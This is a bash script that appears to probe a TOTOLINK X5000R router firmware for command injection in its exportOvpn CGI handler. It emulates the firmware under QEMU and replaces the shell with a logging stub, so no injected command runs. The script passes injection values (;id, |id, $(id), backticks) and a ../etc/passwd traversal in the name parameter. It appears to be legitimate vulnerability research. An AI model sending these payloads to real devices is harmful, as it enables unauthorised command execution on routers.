#!/usr/bin/env bash
set -euo pipefail

ROOT="/root/inout/firmware/unpacked/totolink/CS_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2415_B20250515_ALL/_CS_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2415_B20250515_ALL.web.extracted/squashfs-root"
WORK="/root/inout/work/deepdive/totolink_exportovpn_probe"

rm -rf "$WORK"
mkdir -p "$WORK"
cp -a "$ROOT" "$WORK/rootfs"
rm -f "$WORK/rootfs/var"
mkdir -p "$WORK/rootfs/tmp" "$WORK/rootfs/var/cste" "$WORK/rootfs/etc/openvpn/server/user" "$WORK/rootfs/bin" "$WORK/rootfs/usr/bin"

cat > "$WORK/sh_wrapper.c" <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    const char *cmd = NULL;
    for (int i = 1; i + 1 < argc; i++) {
        if (strcmp(argv[i], "-c") == 0) {
            cmd = argv[i + 1];
            break;
        }
    }
    FILE *f = fopen("/tmp/exportovpn_commands.log", "a");
    if (f) {
        fprintf(f, "%s\n", cmd ? cmd : "");
        fclose(f);
    }
    return 0;
}
EOF
gcc -static -O2 -o "$WORK/sh_wrapper" "$WORK/sh_wrapper.c"
rm -f "$WORK/rootfs/bin/sh"
install -m 0755 "$WORK/sh_wrapper" "$WORK/rootfs/bin/sh"
cp /usr/bin/qemu-mipsel-static "$WORK/rootfs/usr/bin/qemu-mipsel-static"

run_one() {
    local name="$1"
    local qs="$2"
    local out="$WORK/out_${name}.txt"
    env -i \
      QUERY_STRING="$qs" \
      CONTENT_LENGTH=0 \
      REQUEST_METHOD=GET \
      REMOTE_ADDR=127.0.0.1 \
      PATH="/bin:/usr/bin:/usr/sbin:/sbin" \
      chroot "$WORK/rootfs" /usr/bin/qemu-mipsel-static -L / /web/cgi-bin/cstecgi.cgi \
      </dev/null >"$out" 2>&1 || true
    echo "===== $name =====" >> "$WORK/summary.txt"
    echo "$qs" >> "$WORK/summary.txt"
    tail -20 "$out" >> "$WORK/summary.txt"
}

: > "$WORK/summary.txt"
rm -f "$WORK/rootfs/tmp/exportovpn_commands.log"

run_one benign 'exportOvpn&type=user&name=alice&mode=config'
run_one semicolon 'exportOvpn&type=user&name=a;id&mode=config'
run_one pipe 'exportOvpn&type=user&name=a|id&mode=config'
run_one backtick 'exportOvpn&type=user&name=a`id`&mode=config'
run_one dollar 'exportOvpn&type=user&name=a$(id)&mode=config'
run_one space 'exportOvpn&type=user&name=a%20b&mode=config'
run_one slash 'exportOvpn&type=user&name=../etc/passwd&mode=config'
run_one amp 'exportOvpn&type=user&name=a%26id&mode=config'

{
  echo "--- summary ---"
  cat "$WORK/summary.txt"
  echo "--- command log ---"
  cat "$WORK/rootfs/tmp/exportovpn_commands.log" 2>/dev/null || true
  echo "--- exported files ---"
  find "$WORK/rootfs/etc/openvpn/server/user" -maxdepth 2 -type f -print -exec sed -n '1,20p' {} \; 2>/dev/null || true
} | tee "$WORK/evidence.txt"
